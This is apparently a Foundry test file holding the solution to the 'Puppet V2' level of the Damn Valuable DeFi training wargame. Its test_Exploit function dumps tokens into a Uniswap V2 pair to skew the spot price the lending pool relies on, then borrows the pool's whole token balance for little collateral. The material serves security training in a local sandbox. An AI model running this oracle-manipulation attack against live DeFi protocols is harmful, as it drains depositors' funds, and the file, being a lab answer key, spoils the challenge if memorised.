// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";

interface IWETH9 is IERC20 {
    function deposit() external payable;

    function withdraw(uint256) external;
}

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

contract PuppetV2Test is Test {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20 ether;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000 ether;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");

    DamnValuableToken token;
    IWETH9 weth;

    IUniswapV2Factory uniswapFactory;
    IUniswapV2Router02 uniswapRouter;
    IUniswapV2Pair uniswapExchange;
    IPuppetV2Pool lendingPool;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        vm.warp(1_234_567_890);

        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        vm.startPrank(deployer);

        // Deploy token to be traded
        token = new DamnValuableToken();

        weth = IWETH9(deployCode("src/build-uniswap-v2/WETH9.json"));
        vm.label(address(weth), "WETH");

        // Create Uniswap Factory and Router
        uniswapFactory = IUniswapV2Factory(
            deployCode(
                "src/build-uniswap-v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );
        vm.label(address(uniswapFactory), "UniswapFactory");

        uniswapRouter = IUniswapV2Router02(
            deployCode(
                "src/build-uniswap-v2/UniswapV2Router02.json",
                abi.encode(address(uniswapFactory), address(weth))
            )
        );
        vm.label(address(uniswapRouter), "UniswapRouter");

        // Create Uniswap pair against and add Liquidity
        token.approve(address(uniswapRouter), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapRouter.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            0,
            0,
            deployer,
            block.timestamp * 2
        );
        uniswapExchange = IUniswapV2Pair(
            uniswapFactory.getPair(address(token), address(weth))
        );
        vm.label(address(uniswapExchange), "UniswapExchange");

        // Deploy the lending pool
        lendingPool = IPuppetV2Pool(
            deployCode(
                "src/puppet-v2/PuppetV2Pool.json",
                abi.encode(
                    address(weth),
                    address(token),
                    address(uniswapExchange),
                    address(uniswapFactory)
                )
            )
        );
        vm.label(address(lendingPool), "LendingPool");

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        assertGt(uniswapExchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */

        vm.startPrank(player);

        weth.deposit{value: player.balance}();

        console.log("[Before SWAP]");
        console.log(
            "Exchange DVT:  %d",
            token.balanceOf(address(uniswapExchange))
        );
        console.log(
            "Exchange WETH: %d\n",
            weth.balanceOf(address(uniswapExchange))
        );
        console.log("Player WETH:   %d", weth.balanceOf(player));
        console.log(
            "Required WETH: %d\n",
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            )
        );

        // SWAP 10_000 DVT to WETH
        token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapRouter.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            path,
            player,
            block.timestamp * 2
        );

        console.log("[After SWAP]");
        console.log(
            "Exchange DVT:  %d",
            token.balanceOf(address(uniswapExchange))
        );
        console.log(
            "Exchange WETH: %d\n",
            weth.balanceOf(address(uniswapExchange))
        );
        console.log("Player WETH:   %d", weth.balanceOf(player));
        console.log(
            "Required WETH: %d\n",
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            )
        );

        weth.approve(
            address(lendingPool),
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            )
        );
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
    }
}
